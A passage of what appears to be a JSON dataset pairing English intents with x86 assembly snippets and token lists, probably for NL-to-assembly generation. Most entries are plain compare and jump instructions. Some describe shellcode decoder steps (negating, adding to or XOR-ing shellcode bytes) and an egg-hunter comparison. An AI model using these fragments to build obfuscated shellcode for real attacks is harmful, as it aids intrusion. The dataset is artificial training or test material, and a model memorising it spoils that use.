      "0x3": "var2",
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "jump",
      "exit",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "else",
      "move",
      "value",
      "var2",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "exit",
      "\\n",
      "add",
      "al",
      ",",
      "var2"
    ]
  },
  {
    "intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x3 into the al register",
    "rewritten_intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x3 into the al register",
    "snippet": "cmp eax, ebx \\n je exit \\n add al, 0x3",
    "slot_map": {
      "0x3": "var2",
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "exit",
      "label",
      "else",
      "move",
      "value",
      "var2",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "exit",
      "\\n",
      "add",
      "al",
      ",",
      "var2"
    ]
  },
  {
    "intent": "jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x4 into the al register",
    "rewritten_intent": "jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x4 into the al register",
    "snippet": "cmp eax, ebx \\n je exit \\n mov al, 0x4",
    "slot_map": {
      "0x4": "var2",
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "jump",
      "exit",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "else",
      "move",
      "value",
      "var2",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "exit",
      "\\n",
      "mov",
      "al",
      ",",
      "var2"
    ]
  },
  {
    "intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x4 into the al register",
    "rewritten_intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x4 into the al register",
    "snippet": "cmp eax, ebx \\n je exit \\n mov al, 0x4",
    "slot_map": {
      "0x4": "var2",
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "exit",
      "label",
      "else",
      "move",
      "value",
      "var2",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "exit",
      "\\n",
      "mov",
      "al",
      ",",
      "var2"
    ]
  },
  {
    "intent": "jump to the L1 label if the contents of the eax register is equal to the contents of the ebx register",
    "rewritten_intent": "jump to the L1 label if the contents of the eax register is equal to the contents of the ebx register",
    "snippet": "cmp eax, ebx \\n je L1",
    "slot_map": {
      "L1": "var0",
      "eax": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "var1",
      "register",
      "equal",
      "contents",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the L1 label",
    "rewritten_intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the L1 label",
    "snippet": "cmp eax, ebx \\n je L1",
    "slot_map": {
      "L1": "var2",
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "var2",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "var2"
    ]
  },
  {
    "intent": "jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register",
    "rewritten_intent": "jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register",
    "snippet": "cmp eax, ebx \\n jne retry",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "jump",
      "retry",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jne",
      "retry"
    ]
  },
  {
    "intent": "if the contents of the eax register is not equal to the contents of the ebx register then jump to the retry label",
    "rewritten_intent": "if the contents of the eax register is not equal to the contents of the ebx register then jump to the retry label",
    "snippet": "cmp eax, ebx \\n jne retry",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "retry",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jne",
      "retry"
    ]
  },
  {
    "intent": "jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register",
    "rewritten_intent": "jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register",
    "snippet": "cmp eax, edi \\n jne infinite",
    "slot_map": {
      "eax": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "jump",
      "infinite",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jne",
      "infinite"
    ]
  },
  {
    "intent": "if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label",
    "rewritten_intent": "if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label",
    "snippet": "cmp eax, edi \\n jne infinite",
    "slot_map": {
      "eax": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "infinite",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jne",
      "infinite"
    ]
  },
  {
    "intent": "jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register else zero out the eax register",
    "rewritten_intent": "jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register else zero out the eax register",
    "snippet": "cmp eax, edi \\n jne infinite \\n xor eax, eax",
    "slot_map": {
      "eax": "var0",
      "edi": "var2"
    },
    "intent_tokens": [
      "jump",
      "infinite",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var2",
      "register",
      "else",
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var2",
      "\\n",
      "jne",
      "infinite",
      "\\n",
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label else zero out the eax register",
    "rewritten_intent": "if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label else zero out the eax register",
    "snippet": "cmp eax, edi \\n jne infinite \\n xor eax, eax",
    "slot_map": {
      "eax": "var0",
      "edi": "var2"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var2",
      "register",
      "then",
      "jump",
      "infinite",
      "label",
      "else",
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var2",
      "\\n",
      "jne",
      "infinite",
      "\\n",
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "compare the contents of eax with ebx",
    "rewritten_intent": "compare the contents of eax with ebx",
    "snippet": "cmp eax,ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "compare the contents of the ebp register with the value 0",
    "rewritten_intent": "compare the contents of the ebp register with the value 0",
    "snippet": "cmp ebp, 0",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "var0",
      "register",
      "value",
      "0"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "0"
    ]
  },
  {
    "intent": "compare if ebx is zero",
    "rewritten_intent": "compare if ebx is zero",
    "snippet": "cmp ebx, 0",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "compare",
      "if",
      "var0",
      "zero"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "0"
    ]
  },
  {
    "intent": "jump to the exit label if the unsigned contents of the ebx register is greater than the unsigned value 10 else jump to the loop label",
    "rewritten_intent": "jump to the exit label if the unsigned contents of the ebx register is greater than the unsigned value 10 else jump to the loop label",
    "snippet": "cmp ebx, 9 \\n ja exit \\n jmp loop",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "jump",
      "exit",
      "label",
      "if",
      "unsigned",
      "contents",
      "var0",
      "register",
      "greater",
      "unsigned",
      "value",
      "10",
      "else",
      "jump",
      "loop",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "9",
      "\\n",
      "ja",
      "exit",
      "\\n",
      "jmp",
      "loop"
    ]
  },
  {
    "intent": "if the unsigned contents of the ebx register is greater than the unsigned value 10 then jump to the exit label else jump to the loop label",
    "rewritten_intent": "if the unsigned contents of the ebx register is greater than the unsigned value 10 then jump to the exit label else jump to the loop label",
    "snippet": "cmp ebx, 9 \\n ja exit \\n jmp loop",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "if",
      "unsigned",
      "contents",
      "var0",
      "register",
      "greater",
      "unsigned",
      "value",
      "10",
      "then",
      "jump",
      "exit",
      "label",
      "else",
      "jump",
      "loop",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "9",
      "\\n",
      "ja",
      "exit",
      "\\n",
      "jmp",
      "loop"
    ]
  },
  {
    "intent": "compare ecx to 0",
    "rewritten_intent": "compare ecx to 0",
    "snippet": "cmp ecx, 0",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "compare",
      "var0",
      "0"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "0"
    ]
  },
  {
    "intent": "compare if ecx is zero",
    "rewritten_intent": "compare if ecx is zero",
    "snippet": "cmp ecx, 0",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "compare",
      "if",
      "var0",
      "zero"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "0"
    ]
  },
  {
    "intent": "compare ecx with 0h",
    "rewritten_intent": "compare ecx with 0h",
    "snippet": "cmp ecx, 0h",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "compare",
      "var0",
      "0h"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "0h"
    ]
  },
  {
    "intent": "compare if ecx is equal to 10",
    "rewritten_intent": "compare if ecx is equal to 10",
    "snippet": "cmp ecx, 10",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "compare",
      "if",
      "var0",
      "equal",
      "10"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "10"
    ]
  },
  {
    "intent": "compare if ecx is equal to 100",
    "rewritten_intent": "compare if ecx is equal to 100",
    "snippet": "cmp ecx, 100",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "compare",
      "if",
      "var0",
      "equal",
      "100"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "100"
    ]
  },
  {
    "intent": "compare if our counter is equal to 100",
    "rewritten_intent": "compare if our counter is equal to 100",
    "snippet": "cmp ecx, 100",
    "slot_map": {},
    "intent_tokens": [
      "compare",
      "if",
      "our",
      "counter",
      "equal",
      "100"
    ],
    "snippet_tokens": [
      "cmp",
      "ecx",
      ",",
      "100"
    ]
  },
  {
    "intent": "compare ecx with 5",
    "rewritten_intent": "compare ecx with 5",
    "snippet": "cmp ecx, 5",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "compare",
      "var0",
      "5"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "5"
    ]
  },
  {
    "intent": "compare ecx and ebp",
    "rewritten_intent": "compare ecx and ebp",
    "snippet": "cmp ecx, ebp",
    "slot_map": {
      "ecx": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "compare",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "compare the contents of the ecx register with the contents of the ebp register",
    "rewritten_intent": "compare the contents of the ecx register with the contents of the ebp register",
    "snippet": "cmp ecx, ebp",
    "slot_map": {
      "ecx": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the l1 label if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register",
    "rewritten_intent": "jump to the l1 label if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register",
    "snippet": "cmp ecx, edx \\n ja l1",
    "slot_map": {
      "l1": "var0",
      "ecx": "var1",
      "edx": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "unsigned",
      "contents",
      "var1",
      "register",
      "greater",
      "unsigned",
      "contents",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "ja",
      "var0"
    ]
  },
  {
    "intent": "if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else",
    "rewritten_intent": "if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else",
    "snippet": "cmp ecx, edx \\n ja l1",
    "slot_map": {
      "ecx": "var0",
      "edx": "var1",
      "l1": "var2"
    },
    "intent_tokens": [
      "if",
      "unsigned",
      "contents",
      "var0",
      "register",
      "greater",
      "unsigned",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "var2",
      "label",
      "else"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "ja",
      "var2"
    ]
  },
  {
    "intent": "compare if edi is equal to 0",
    "rewritten_intent": "compare if edi is equal to 0",
    "snippet": "cmp edi, 0",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "compare",
      "if",
      "var0",
      "equal",
      "0"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "0"
    ]
  },
  {
    "intent": "compare if edx is zero",
    "rewritten_intent": "compare if edx is zero",
    "snippet": "cmp edx, 0",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "compare",
      "if",
      "var0",
      "zero"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "0"
    ]
  },
  {
    "intent": "jump to the loop label if the unsigned contents of the edx register is greater than the unsigned value 0x43 else push the contents of the edx register onto the stack",
    "rewritten_intent": "jump to the loop label if the unsigned contents of the edx register is greater than the unsigned value 0x43 else push the contents of the edx register onto the stack",
    "snippet": "cmp edx, 0x43 \\n ja loop \\n push edx",
    "slot_map": {
      "0x43": "var2",
      "edx": "var0"
    },
    "intent_tokens": [
      "jump",
      "loop",
      "label",
      "if",
      "unsigned",
      "contents",
      "var0",
      "register",
      "greater",
      "unsigned",
      "value",
      "var2",
      "else",
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var2",
      "\\n",
      "ja",
      "loop",
      "\\n",
      "push",
      "var0"
    ]
  },
  {
    "intent": "if the unsigned contents of the edx register is greater than the unsigned value 0x43 then jump to the loop label else push the contents of the edx register onto the stack",
    "rewritten_intent": "if the unsigned contents of the edx register is greater than the unsigned value 0x43 then jump to the loop label else push the contents of the edx register onto the stack",
    "snippet": "cmp edx, 0x43 \\n ja loop \\n push edx",
    "slot_map": {
      "0x43": "var2",
      "edx": "var0"
    },
    "intent_tokens": [
      "if",
      "unsigned",
      "contents",
      "var0",
      "register",
      "greater",
      "unsigned",
      "value",
      "var2",
      "then",
      "jump",
      "loop",
      "label",
      "else",
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var2",
      "\\n",
      "ja",
      "loop",
      "\\n",
      "push",
      "var0"
    ]
  },
  {
    "intent": "compare whether the edx register has reached 10",
    "rewritten_intent": "compare whether the edx register has reached 10",
    "snippet": "cmp edx, 10",
    "slot_map": {
      "whether": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "compare",
      "var0",
      "var1",
      "register",
      "has",
      "reached",
      "10"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "10"
    ]
  },
  {
    "intent": "compare the contents of edx to 42",
    "rewritten_intent": "compare the contents of edx to 42",
    "snippet": "cmp edx, 42",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "var0",
      "42"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "42"
    ]
  },
  {
    "intent": "jump to loc_402B13 if the contents of the edx register is equal to 42",
    "rewritten_intent": "jump to loc_402B13 if the contents of the edx register is equal to 42",
    "snippet": "cmp edx, 42 \\n je short loc_402B13",
    "slot_map": {
      "loc_402B13": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "equal",
      "42"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "42",
      "\\n",
      "je",
      "short",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the edx register is equal to 42 then jump to loc_402B13",
    "rewritten_intent": "if the contents of the edx register is equal to 42 then jump to loc_402B13",
    "snippet": "cmp edx, 42 \\n je short loc_402B13",
    "slot_map": {
      "loc_402B13": "var1",
      "edx": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "42",
      "then",
      "jump",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "42",
      "\\n",
      "je",
      "short",
      "var1"
    ]
  },
  {
    "intent": "compare the contents of edx and the contents of ebx",
    "rewritten_intent": "compare the contents of edx and the contents of ebx",
    "snippet": "cmp edx, ebx",
    "slot_map": {
      "edx": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "var0",
      "and",
      "contents",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register",
    "rewritten_intent": "jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register",
    "snippet": "cmp edx, ebx \\n je 0x8 \\n",
    "slot_map": {
      "0x8": "var0",
      "edx": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "address",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "equal",
      "contents",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "je",
      "var0",
      "\\n"
    ]
  },
  {
    "intent": "if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8",
    "rewritten_intent": "if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8",
    "snippet": "cmp edx, ebx \\n je 0x8 \\n",
    "slot_map": {
      "0x8": "var2",
      "edx": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "memory",
      "address",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "var2",
      "\\n"
    ]
  },
  {
    "intent": "jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register",
    "rewritten_intent": "jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register",
    "snippet": "cmp edx, ebx \\n je 0x8 \\n mov ebx, edx",
    "slot_map": {
      "0x8": "var0",
      "edx": "var1",
      "ebx": "var3"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "address",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "equal",
      "contents",
      "var3",
      "register",
      "else",
      "move",
      "contents",
      "var1",
      "register",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var3",
      "\\n",
      "je",
      "var0",
      "\\n",
      "mov",
      "var3",
      ",",
      "var1"
    ]
  },
  {
    "intent": "if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8 else move the contents of the edx register into the ebx register",
    "rewritten_intent": "if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8 else move the contents of the edx register into the ebx register",
    "snippet": "cmp edx, ebx \\n je 0x8 \\n mov ebx, edx",
    "slot_map": {
      "0x8": "var4",
      "edx": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var2",
      "register",
      "then",
      "jump",
      "memory",
      "address",
      "var4",
      "else",
      "move",
      "contents",
      "var0",
      "register",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var2",
      "\\n",
      "je",
      "var4",
      "\\n",
      "mov",
      "var2",
      ",",
      "var0"
    ]
  },
  {
    "intent": "compare if esi is equal to 10",
    "rewritten_intent": "compare if esi is equal to 10",
    "snippet": "cmp esi, 10",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "compare",
      "if",
      "var0",
      "equal",
      "10"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "10"
    ]
  },
  {
    "intent": "jump to the find_egg label if the contents of the esi register is equal to the contents of the edx register",
    "rewritten_intent": "jump to the find_egg label if the contents of the esi register is equal to the contents of the edx register",
    "snippet": "cmp esi, edx \\n je find_egg",
    "slot_map": {
      "find_egg": "var0",
      "esi": "var1",
      "edx": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "var1",
      "register",
      "equal",
      "contents",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "compare the word at the address ecx and 0x5951",
    "rewritten_intent": "compare the word at the address ecx and 0x5951",
    "snippet": "cmp word [ecx], 0x5951",
    "slot_map": {
      "0x5951": "var1",
      "ecx": "var0"
    },
    "intent_tokens": [
      "compare",
      "word",
      "address",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "word",
      "[",
      "var0",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "define the code label",
    "rewritten_intent": "define the code label",
    "snippet": "code:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "code",
      "label"
    ],
    "snippet_tokens": [
      "code",
      ":"
    ]
  },
  {
    "intent": "define connect function",
    "rewritten_intent": "define connect function",
    "snippet": "connect:",
    "slot_map": {
      "connect": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the cont label",
    "rewritten_intent": "define the cont label",
    "snippet": "cont:",
    "slot_map": {
      "cont": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define a string db and initialize to 'hello world!'",
    "rewritten_intent": "define a string db and initialize to 'hello world!'",
    "snippet": "contents db 'hello world!', 0h",
    "slot_map": {
      "'hello world!'": "var0"
    },
    "intent_tokens": [
      "define",
      "string",
      "db",
      "and",
      "initialize",
      "var0"
    ],
    "snippet_tokens": [
      "contents",
      "db",
      "var0",
      ",",
      "0h"
    ]
  },
  {
    "intent": "declare the createfile label",
    "rewritten_intent": "declare the createfile label",
    "snippet": "createfile:",
    "slot_map": {
      "createfile": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define createfile function",
    "rewritten_intent": "define createfile function",
    "snippet": "createfile:",
    "slot_map": {
      "createfile": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the cycle label",
    "rewritten_intent": "declare the cycle label",
    "snippet": "cycle:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "cycle",
      "label"
    ],
    "snippet_tokens": [
      "cycle",
      ":"
    ]
  },
  {
    "intent": "declare D1 and move the current byte of the shellcode in the cl register",
    "rewritten_intent": "declare D1 and move the current byte of the shellcode in the cl register",
    "snippet": "D1: \\n mov cl, byte [esi]",
    "slot_map": {
      "D1": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "and",
      "move",
      "current",
      "byte",
      "shellcode",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "mov",
      "cl",
      ",",
      "byte",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "declare D1 and move the current byte of the shellcode in the dl register",
    "rewritten_intent": "declare D1 and move the current byte of the shellcode in the dl register",
    "snippet": "D1: \\n mov dl, byte [esi]",
    "slot_map": {
      "D1": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "and",
      "move",
      "current",
      "byte",
      "shellcode",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "mov",
      "dl",
      ",",
      "byte",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "in D1 save the shellcode in esi and move it to edi",
    "rewritten_intent": "in D1 save the shellcode in esi and move it to edi",
    "snippet": "D1: \\n pop esi \\n mov edi, esi",
    "slot_map": {
      "D1": "var0",
      "esi": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "in",
      "var0",
      "save",
      "shellcode",
      "var1",
      "and",
      "move",
      "it",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "pop",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "var1"
    ]
  },
  {
    "intent": "define the function D2 and negate the byte in esi",
    "rewritten_intent": "define the function D2 and negate the byte in esi",
    "snippet": "D2: \\n not byte [esi]",
    "slot_map": {
      "D2": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "define",
      "function",
      "var0",
      "and",
      "negate",
      "byte",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "byte",
      "[",
      "var1",
      "]"
    ]
  },
  {
    "intent": "declare the function D2 and negate the current byte of the shellcode",
    "rewritten_intent": "declare the function D2 and negate the current byte of the shellcode",
    "snippet": "D2: \\n not byte [esi]",
    "slot_map": {
      "D2": "var0"
    },
    "intent_tokens": [
      "declare",
      "function",
      "var0",
      "and",
      "negate",
      "current",
      "byte",
      "shellcode"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "byte",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "define D2 save the in esi the pointer to the shellcode and move esi into edi",
    "rewritten_intent": "define D2 save the in esi the pointer to the shellcode and move esi into edi",
    "snippet": "D2: \\n pop esi \\n mov edi, esi",
    "slot_map": {
      "D2": "var0",
      "esi": "var1",
      "edi": "var3"
    },
    "intent_tokens": [
      "define",
      "var0",
      "save",
      "var1",
      "pointer",
      "shellcode",
      "and",
      "move",
      "var1",
      "var3"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "pop",
      "var1",
      "\\n",
      "mov",
      "var3",
      ",",
      "var1"
    ]
  },
  {
    "intent": "declare the ruotine D3 and add the value 5 to the current byte of the shellcode",
    "rewritten_intent": "declare the ruotine D3 and add the value 5 to the current byte of the shellcode",
    "snippet": "D3: \\n add byte [esi], 5",
    "slot_map": {
      "D3": "var1",
      "ruotine": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "var1",
      "and",
      "add",
      "value",
      "5",
      "current",
      "byte",
      "shellcode"
    ],
    "snippet_tokens": [
      "var1",
      ":",
      "\\n",
      "add",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "5"
    ]
  },
  {
    "intent": "declare the function D3, store the shellcode in edi and move the pointer into esi",
    "rewritten_intent": "declare the function D3, store the shellcode in edi and move the pointer into esi",
    "snippet": "D3: \\n pop esi \\n mov edi, esi",
    "slot_map": {
      "D3": "var0",
      "edi": "var1",
      "esi": "var2"
    },
    "intent_tokens": [
      "declare",
      "function",
      "var0",
      "store",
      "shellcode",
      "var1",
      "and",
      "move",
      "pointer",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "pop",
      "var2",
      "\\n",
      "mov",
      "var1",
      ",",
      "var2"
    ]
  },
  {
    "intent": "define the function D4 and perform the xor operation between the byte in esi and the 0x1 value",
    "rewritten_intent": "define the function D4 and perform the xor operation between the byte in esi and the 0x1 value",
    "snippet": "D4: \\n xor byte [esi], 0x1",
    "slot_map": {
      "D4": "var0",
      "0x1": "var2",
      "esi": "var1"
    },
    "intent_tokens": [
      "define",
      "function",
      "var0",
      "and",
      "perform",
